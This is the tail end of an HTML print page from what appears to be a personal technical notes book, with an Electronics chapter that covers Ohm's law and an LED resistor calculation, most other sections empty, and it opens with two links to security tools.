<li><a href="https://github.com/CiscoCXSecurity/linikatz">Linikatz</a></li>
<li><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="electronics"><a class="header" href="#electronics">Electronics</a></h1>
<ul>
<li><a href="#ohms-law">Laws</a></li>
<li><a href="#resistors">Resistors</a></li>
<li><a href="#capacitors">Capacitors</a></li>
<li><a href="#inductors">Inductors</a></li>
<li><a href="#diodes">Diodes</a></li>
<li><a href="#transistors">Transistors</a></li>
<li><a href="#operational-amplifiers">Operational Amplifiers</a></li>
<li><a href="#digital-logic-gates">Digital Logic Gates</a></li>
<li><a href="#555-timer-ic">555 Timer IC</a></li>
<li><a href="#microcontrollers">Microcontrollers</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ohms-law"><a class="header" href="#ohms-law">Ohms Law</a></h1>
<p>Ohm‚Äôs Law is a fundamental principle in electronics that describes the relationship between voltage (V), current (I), and resistance (R) in an electrical circuit. It is mathematically expressed as:</p>
<pre><code>V = IR (Voltage = current * resistance)
</code></pre>
<p>From this equation, we can derive the following formulas:</p>
<pre><code>Current = V / R
Resistance = V / I
</code></pre>
<p>Find the appropriate resistor size for a given voltage, forward voltage, and current (amperage):
<em>Forward voltage can usually be found in the datasheet of the component being used (like an LED).</em></p>
<pre><code>resistance = (supply_voltage - forward_voltage) / current
</code></pre>
<h5 id="example-led"><a class="header" href="#example-led">Example (LED):</a></h5>
<p>Supply voltage: 9v battery
Forward voltage: 5.2v
Desired current: 20Ma (.02A)</p>
<pre><code>(9 - 5.2) / .02 = 190 Ohms
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="resistors"><a class="header" href="#resistors">Resistors</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="capacitors"><a class="header" href="#capacitors">Capacitors</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="inductors"><a class="header" href="#inductors">Inductors</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="diodes"><a class="header" href="#diodes">Diodes</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="transistors"><a class="header" href="#transistors">Transistors</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="operational-amplifiers"><a class="header" href="#operational-amplifiers">Operational Amplifiers</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="digital-logic-gates"><a class="header" href="#digital-logic-gates">Digital Logic Gates</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="555-timer-ic"><a class="header" href="#555-timer-ic">555 Timer IC</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="microcontrollers"><a class="header" href="#microcontrollers">Microcontrollers</a></h1>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>

        <template id=fa-eye><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z"/></svg></span></template>
        <template id=fa-eye-slash><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c5.2-11.8 8-24.8 8-38.5c0-53-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zm223.1 298L373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5z"/></svg></span></template>
        <template id=fa-copy><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M502.6 70.63l-61.25-61.25C435.4 3.371 427.2 0 418.7 0H255.1c-35.35 0-64 28.66-64 64l.0195 256C192 355.4 220.7 384 256 384h192c35.2 0 64-28.8 64-64V93.25C512 84.77 508.6 76.63 502.6 70.63zM464 320c0 8.836-7.164 16-16 16H255.1c-8.838 0-16-7.164-16-16L239.1 64.13c0-8.836 7.164-16 16-16h128L384 96c0 17.67 14.33 32 32 32h47.1V320zM272 448c0 8.836-7.164 16-16 16H63.1c-8.838 0-16-7.164-16-16L47.98 192.1c0-8.836 7.164-16 16-16H160V128H63.99c-35.35 0-64 28.65-64 64l.0098 256C.002 483.3 28.66 512 64 512h192c35.2 0 64-28.8 64-64v-32h-47.1L272 448z"/></svg></span></template>
        <template id=fa-play><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M73 39c-14.8-9.1-33.4-9.4-48.5-.9S0 62.6 0 80V432c0 17.4 9.4 33.4 24.5 41.9s33.7 8.1 48.5-.9L361 297c14.3-8.7 23-24.2 23-41s-8.7-32.2-23-41L73 39z"/></svg></span></template>
        <template id=fa-clock-rotate-left><span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M75 75L41 41C25.9 25.9 0 36.6 0 57.9V168c0 13.3 10.7 24 24 24H134.1c21.4 0 32.1-25.9 17-41l-30.8-30.8C155 85.5 203 64 256 64c106 0 192 86 192 192s-86 192-192 192c-40.8 0-78.6-12.7-109.7-34.4c-14.5-10.1-34.4-6.6-44.6 7.9s-6.6 34.4 7.9 44.6C151.2 495 201.7 512 256 512c141.4 0 256-114.6 256-256S397.4 0 256 0C185.3 0 121.3 28.7 75 75zm181 53c-13.3 0-24 10.7-24 24V256c0 6.4 2.5 12.5 7 17l72 72c9.4 9.4 24.6 9.4 33.9 0s9.4-24.6 0-33.9l-65-65V152c0-13.3-10.7-24-24-24z"/></svg></span></template>



        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr-ef4e11c1.min.js"></script>
        <script src="mark-09e88c2c.min.js"></script>
        <script src="searcher-c2a407aa.js"></script>

        <script src="clipboard-1626706a.min.js"></script>
        <script src="highlight-abc7f01d.js"></script>
        <script src="book-a0b12cfe.js"></script>

        <!-- Custom JS scripts -->

        <script>
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>


    </div>
    </body>
</html>
